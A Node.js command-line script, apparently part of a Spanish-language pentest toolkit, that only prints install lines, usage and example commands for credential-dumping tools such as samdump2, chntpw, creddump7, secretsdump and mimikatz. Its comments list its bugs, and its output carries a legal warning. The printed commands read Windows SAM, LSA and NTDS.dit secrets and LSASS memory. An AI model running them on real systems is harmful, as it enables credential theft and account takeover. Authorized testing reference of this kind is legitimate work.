#!/usr/bin/env node
/**
 * MFH TOOLS - OS Credential Dumping
 * Acceso con Credenciales
 * 
 * Integra: chntpw, samdump2, creddump7, secretsdump, mimikatz
 * 
 * Uso: node credential-dumping.js --target <SAM_file|hive_dir> [--tool <nombre>]
 * 
 * Autor: FalconMX Security
 */

'use strict';

const CONFIG = { version: '1.0.0', author: 'FalconMX Security' };

// ============================================================
// HERRAMIENTAS DE CREDENTIAL DUMPING
// ============================================================
const TOOLS = {
    samdump2: {
        name: 'samdump2',
        description: 'Extrae hashes del SAM de Windows usando la SYSKEY',
        install: [
            'sudo apt install samdump2'
        ],
        usage: [
            'samdump2 <SYSTEM_file> <SAM_file>',
            'samdump2 /mnt/win/Windows/System32/config/SYSTEM /mnt/win/Windows/System32/config/SAM'
        ],
        notes: [
            'Requiere acceso al SAM y SYSTEM hive',
            'El SAM está en %SystemRoot%\\System32\\config\\SAM',
            'Requiere permisos SYSTEM para leer directamente'
        ],
        example: 'samdump2 /path/to/SYSTEM /path/to/SAM > hashes.txt'
    },
    chntpw: {
        name: 'chntpw',
        description: 'Edita la base de datos SAM (reset de contraseñas offline)',
        install: [
            'sudo apt install chntpw'
        ],
        usage: [
            'chntpw -l <SAM_file>              # Listar usuarios',
            'chntpw -u <username> <SAM_file>   # Cambiar contraseña',
            'chntpw -i <SAM_file>              # Modo interactivo'
        ],
        notes: [
            'Bootea desde Live CD/USB (Kali)',
            'Múltiples comandos disponibles para manipular SAM',
            'Puede resetear contraseña del Administrador'
        ],
        example: 'chntpw -i /mnt/win/Windows/System32/config/SAM'
    },
    creddump7: {
        name: 'creddump7',
        description: 'Extrae hashes SAM, LSA secrets y cached domain credentials',
        install: [
            'sudo apt install creddump7'
        ],
        usage: [
            'pwdump.py <SYSTEM_hive> <SAM_hive>       # Hashes locales',
            'lsadump.py <SYSTEM_hive> <SECURITY_hive> # LSA secrets',
            'cachedump.py <SYSTEM_hive> <SECURITY_hive> <Vista/7> # Cached creds'
        ],
        notes: [
            'Python tool, multiplataforma',
            'Extrae LM y NT hashes (SYSKEY protected)',
            'Extrae cached domain passwords',
            'Extrae LSA secrets'
        ],
        example: 'pwdump.py SYSTEM SAM > hashes.txt'
    },
    secretsdump: {
        name: 'secretsdump.py (Impacket)',
        description: 'Extrae credenciales de SAM, LSA, NTDS.dit remotamente',
        install: [
            'pip install impacket',
            'python3 -m pip install impacket'
        ],
        usage: [
            'secretsdump.py <domain>/<user>:<password>@<target>',
            'secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL',
            'secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL'
        ],
        notes: [
            'Soporta extracción remota via SMB/WMI',
            'Extrae hashes NTLM de SAM',
            'Extrae LSA secrets',
            'Extrae NTDS.dit (hashes de dominio)'
        ],
        example: 'secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL'
    },
    mimikatz: {
        name: 'Mimikatz',
        description: 'Extrae credenciales de memoria (LSASS)',
        install: [
            '# Descargar desde: https://github.com/gentilkiwi/mimikatz/releases',
            '# O compilar desde source'
        ],
        usage: [
            'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"',
            'mimikatz.exe "lsadump::sam" "exit"',
            'mimikatz.exe "lsadump::lsa /inject" "exit"'
        ],
        notes: [
            'Solo Windows',
            'Requiere privilegios SYSTEM',
            'Puede ser detectado por AV/EDR',
            'Alternativa: procdump + mimikatz offline'
        ],
        example: 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"'
    }
};

// ============================================================
// REPORTE
// ============================================================
/**
 * Credential Dumping es un generador de comandos, no un volcador de credenciales.
 * No extrae nada (no lanza samdump2, chntpw, pwdump.py, secretsdump.py,
 * mimikatz.exe). Solo imprime comandos genéricos de 5 herramientas.
 *
 * Lo que realmente hace:
 * - Imprime un reporte con instalación, uso, notas y ejemplo de 5 herramientas.
 * - Muestra el target en el header (pero no lo usa en comandos).
 * - Acepta --tool para elegir una herramienta o 'all'.
 * - Advertencia legal específica.
 *
 * Bugs funcionales conocidos:
 * - --target es DECORATIVO: solo se muestra en el header. Los comandos tienen
 *   paths fijos (/path/to/SYSTEM, /mnt/win/...). El usuario pasa
 *   --target /mnt/win esperando comandos para /mnt/win/.../SAM y recibe
 *   /path/to/SYSTEM (fijo). Ni siquiera los ejemplos usan el target.
 * - --tool inválida no advierte: cae silenciosamente a mostrar todas.
 * - --target no valida: acepta cualquier string (noesunpath, C:\Windows\...).
 * - Exit code 0 en todos los casos (no hay process.exit(1)).
 *
 * Ventaja de seguridad:
 * - No interpola target → sin inyección por copiar/pegar.
 *   Igual que Bluetooth Scanning y RF Scanning.
 *
 * Limitaciones:
 * - No extrae credenciales (solo imprime comandos).
 * - Mimikatz es para Windows (.NET), no Linux, aunque se documenta.
 * - No hace cred dumping real.
 */
function printReport(target, selectedTool) {
    console.log('');
    console.log('═'.repeat(65));
    console.log('  🔐 OS CREDENTIAL DUMPING REPORT');
    console.log('  Target: ' + (target || 'No especificado'));
    console.log('  Fecha: ' + new Date().toISOString());
    console.log('═'.repeat(65));
    console.log('');

    var toolsToShow = selectedTool === 'all' ? Object.keys(TOOLS) :
                      TOOLS[selectedTool] ? [selectedTool] : Object.keys(TOOLS);

    toolsToShow.forEach(function(key) {
        var tool = TOOLS[key];
        console.log('📌 ' + tool.name);
        console.log('   ' + tool.description);
        console.log('');
        console.log('   🔧 Instalación:');
        tool.install.forEach(function(line) { console.log('      ' + line); });
        console.log('');
        console.log('   💻 Uso:');
        tool.usage.forEach(function(line) { console.log('      ' + line); });
        console.log('');
        console.log('   📝 Notas:');
        tool.notes.forEach(function(line) { console.log('      • ' + line); });
        console.log('');
        console.log('   🎯 Ejemplo:');
        console.log('      ' + tool.example);
        console.log('');
        console.log('─'.repeat(65));
        console.log('');
    });

    console.log('  ⚠️ ADVERTENCIA');
    console.log('     Solo extrae credenciales de sistemas que te pertenezcan');
    console.log('     o para los que tengas autorización escrita.');
    console.log('     El acceso no autorizado a credenciales es un delito.');
    console.log('');
    console.log('─'.repeat(65));
    console.log('');
}

// ============================================================
// CLI
// ============================================================
function main() {
    var args = process.argv.slice(2);
    var targetIdx = args.indexOf('--target');
    var toolIdx = args.indexOf('--tool');

    if (args.length === 0 || (targetIdx === -1 && toolIdx === -1)) {
        console.log('');
        console.log('╔══════════════════════════════════════════════════════╗');
        console.log('║  MFH TOOLS — OS Credential Dumping v' + CONFIG.version + '           ║');
        console.log('║  ' + CONFIG.author + '                              ║');
        console.log('╚══════════════════════════════════════════════════════╝');
        console.log('');
        console.log('  Uso: node credential-dumping.js --target <path> [--tool <nombre>]');
        console.log('');
        console.log('  Herramientas:');
        Object.keys(TOOLS).forEach(function(k) {
            console.log('    • ' + k + ' - ' + TOOLS[k].name);
        });
        console.log('');
        console.log('  Ejemplos:');
        console.log('    node credential-dumping.js --target /mnt/win');
        console.log('    node credential-dumping.js --target SAM --tool creddump7');
        console.log('');
        process.exit(0);
    }

    var target = targetIdx !== -1 ? args[targetIdx + 1] : null;
    var tool = toolIdx !== -1 ? args[toolIdx + 1].toLowerCase() : 'all';

    console.log('\n🔐 Generando comandos de Credential Dumping...\n');
    printReport(target, tool);
}

main();
